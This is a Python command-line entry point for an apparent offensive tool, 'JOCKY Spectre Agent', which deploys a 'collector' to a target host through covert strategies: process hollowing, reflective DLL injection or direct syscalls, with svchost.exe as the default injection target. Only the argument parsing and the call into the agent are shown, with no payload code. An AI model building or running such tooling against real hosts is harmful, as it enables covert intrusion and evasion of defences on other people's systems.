"""Entry point for: python3 -m jocky.spectre"""

import argparse
from .agent import SpectreAgent


def main():
    parser = argparse.ArgumentParser(
        prog="jocky.spectre",
        description="JOCKY Spectre Agent — Covert deployment strategies",
    )
    sub = parser.add_subparsers(dest="command")

    deploy_p = sub.add_parser("deploy", help="Deploy collector using a covert strategy")
    deploy_p.add_argument("--strategy", required=True,
                          choices=["HOLLOW", "RDLL", "SYSCALL",
                                   "PROCESS_HOLLOW", "REFLECTIVE_DLL", "DIRECT_SYSCALL"],
                          help="Deployment strategy")
    deploy_p.add_argument("--host", required=True, help="Target host")
    deploy_p.add_argument("--target", "--target-process", default="svchost.exe",
                          help="Target process for injection (default: svchost.exe)")

    args = parser.parse_args()

    if args.command is None:
        parser.print_help()
        return

    strategy_map = {
        "HOLLOW": "PROCESS_HOLLOW",
        "RDLL": "REFLECTIVE_DLL",
        "SYSCALL": "DIRECT_SYSCALL",
        "PROCESS_HOLLOW": "PROCESS_HOLLOW",
        "REFLECTIVE_DLL": "REFLECTIVE_DLL",
        "DIRECT_SYSCALL": "DIRECT_SYSCALL",
    }
    strategy = strategy_map[args.strategy]

    agent = SpectreAgent()
    agent.deploy_verbose(strategy, args.host, args.target)


if __name__ == "__main__":
    main()
